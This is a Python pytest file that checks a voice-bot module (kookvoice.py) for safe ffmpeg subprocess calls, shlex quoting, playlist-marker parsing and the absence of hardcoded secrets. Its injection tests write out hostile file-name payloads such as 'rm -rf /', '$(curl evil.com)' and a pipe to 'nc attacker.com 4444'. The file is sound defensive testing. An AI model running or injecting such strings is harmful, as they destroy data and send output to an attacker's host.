"""测试 kookvoice/kookvoice.py — Shell 注入防护、subprocess 安全性、歌词解析"""

import os
import sys
import shlex
import asyncio
from unittest import mock

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# ── shlex.quote 使用验证（需要原文件有 import shlex）──────────────────

def test_shlex_is_imported():
    """确认 kookvoice 模块导入了 shlex（Shell 注入防护所需）"""
    import kookvoice  # type: ignore[import-untyped]
    assert shlex is not None  # shlex 作为标准库必定可用
    # 验证模块中确实使用了 shlex
    kvoice_path = os.path.join(
        os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
    )
    with open(kvoice_path) as f:
        source = f.read()
    assert "import shlex" in source, "kookvoice.py 缺少 import shlex"
    assert "shlex.quote" in source, "kookvoice.py 不使用 shlex.quote"


# ── 安全：subprocess_exec vs subprocess_shell ──────────────────────

class TestSubprocessSafety:
    """验证 kookvoice 不再使用 subprocess_shell"""

    def test_no_subprocess_shell_for_ffmpeg(self):
        """ffmpeg/ffprobe 调用不应使用 subprocess_shell"""
        kvoice_path = os.path.join(
            os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
        )
        with open(kvoice_path) as f:
            source = f.read()
        # 确认使用 create_subprocess_exec 而非 create_subprocess_shell
        assert "create_subprocess_exec" in source, \
            "应使用 create_subprocess_exec 代替 subprocess_shell"
        # 不应该有残留的 subprocess_shell（除注释外）
        shell_count = sum(
            1 for line in source.split("\n")
            if "subprocess_shell" in line and not line.strip().startswith("#")
        )
        assert shell_count == 0, \
            f"发现 {shell_count} 处 subprocess_shell (非注释) 残留"

    def test_no_shell_injection_string_building(self):
        """不应存在字符串拼接构建 shell 命令的代码"""
        kvoice_path = os.path.join(
            os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
        )
        with open(kvoice_path) as f:
            source = f.read()
        # 不应有 f"ffmpeg ... file_str" 这类注入模式（带外源变量但在字符串中直接拼接）
        # 我们用更温和的检测：确认主要参数构建使用了 list
        assert '"-i", file' in source or '"-i", file,' in source, \
            "ffmpeg 参数应使用列表而非字符串拼接"

    def test_extra_command_uses_shlex_split(self):
        """extra_command 应使用 shlex.split 解析"""
        kvoice_path = os.path.join(
            os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
        )
        with open(kvoice_path) as f:
            source = f.read()
        assert "shlex.split(extra_command)" in source, \
            "extra_command 应使用 shlex.split 安全解析"


# ── 歌词/歌单解析 split(":", maxsplit) ──────────────────────────

class TestPlaylistParsing:
    """歌单标记 PLAYLIST_SONG: 解析安全"""

    def test_split_with_colon_in_name(self):
        """歌名含冒号不会截断（使用 split with maxsplit）"""
        kvoice_path = os.path.join(
            os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
        )
        with open(kvoice_path) as f:
            source = f.read()
        # 确认 split 使用了 maxsplit 参数
        assert 'split("|||", 3)' in source or "split('|||', 3)" in source, \
            "歌单标记解析应使用 split(..., 3) 防止歌名含冒号时截断"

    def test_song_marker_format(self):
        """PLAYLIST_SONG 标记格式校验"""
        marker = "PLAYLIST_SONG|||12345|||歌名|||艺术家"
        parts = marker.split("|||", 3)
        assert parts[0] == "PLAYLIST_SONG"
        assert parts[1] == "12345"
        assert parts[2] == "歌名"
        assert parts[3] == "艺术家"


# ── 参数列表化安全 ──────────────────────────────────────────────

class TestArgsListing:
    """ffmpeg 命令参数应为列表，不可为字符串拼接"""

    def test_decode_args_is_list(self):
        """解码参数 decode_args 应为列表"""
        kvoice_path = os.path.join(
            os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
        )
        with open(kvoice_path) as f:
            source = f.read()
        assert "decode_args = [" in source, \
            "decode_args 应构建为列表而非字符串"

    def test_enc_args_is_list(self):
        """编码参数 enc_args 应为列表"""
        kvoice_path = os.path.join(
            os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
        )
        with open(kvoice_path) as f:
            source = f.read()
        assert "enc_args = [" in source, \
            "enc_args 应构建为列表而非字符串"


# ── shlex.quote 行为验证 ─────────────────────────────────────

class TestShlexQuote:
    """shlex.quote 防止 Shell 注入"""

    def test_quote_spaces(self):
        """空格被正确转义"""
        result = shlex.quote("file with spaces.mp3")
        assert result == "'file with spaces.mp3'"

    def test_quote_special_chars(self):
        """特殊字符被转义"""
        result = shlex.quote("song; rm -rf /")
        assert ";" in result
        assert result.startswith("'")

    def test_quote_empty(self):
        """空字符串"""
        result = shlex.quote("")
        assert result == "''"

    def test_extra_args_expansion(self):
        """extra_args 展开方式正确"""
        extra_command = "-af volume=0.5"
        extra_args = shlex.split(extra_command) if extra_command else []
        assert extra_args == ["-af", "volume=0.5"]

    def test_empty_extra_command(self):
        """空 extra_command 返回空列表"""
        extra_args = shlex.split("") if "" else []
        assert extra_args == []


# ── 参数注入攻击场景 ──────────────────────────────────────────

class TestInjectionScenarios:
    """典型注入攻击字符串在 shlex.quote 下无害化"""

    def test_command_injection_in_filename(self):
        """文件名含分号 + rm 不造成命令执行"""
        malicious = "song.mp3; rm -rf /"
        quoted = shlex.quote(malicious)
        assert "rm" in quoted
        assert quoted.startswith("'") and quoted.endswith("'")

    def test_backtick_injection(self):
        """反引号注入被转义"""
        malicious = "`whoami`"
        quoted = shlex.quote(malicious)
        assert quoted.startswith("'")

    def test_dollar_substitution(self):
        """$() 命令替换被转义"""
        malicious = "$(curl evil.com)"
        quoted = shlex.quote(malicious)
        assert quoted.startswith("'")

    def test_pipe_injection(self):
        """管道注入被转义"""
        malicious = "song.mp3 | nc attacker.com 4444"
        quoted = shlex.quote(malicious)
        assert quoted.startswith("'")

    def test_filename_with_single_quote(self):
        """文件名含单引号"""
        malicious = "it's a song.mp3"
        quoted = shlex.quote(malicious)
        # shlex.quote 应该正确处理引号
        assert "it" in quoted


# ── 无硬编码凭据 ──────────────────────────────────────────────

class TestNoSecrets:
    """kookvoice.py 不应含硬编码凭据"""

    def test_no_hardcoded_tokens(self):
        kvoice_path = os.path.join(
            os.path.dirname(__file__), "..", "kookvoice", "kookvoice.py"
        )
        with open(kvoice_path) as f:
            source = f.read()
        import re
        suspicious = re.findall(
            r'(?:token|secret|password|api_key)\s*=\s*["\']([^"\']{10,})["\']',
            source, re.IGNORECASE
        )
        assert len(suspicious) == 0, f"发现硬编码凭据: {suspicious}"
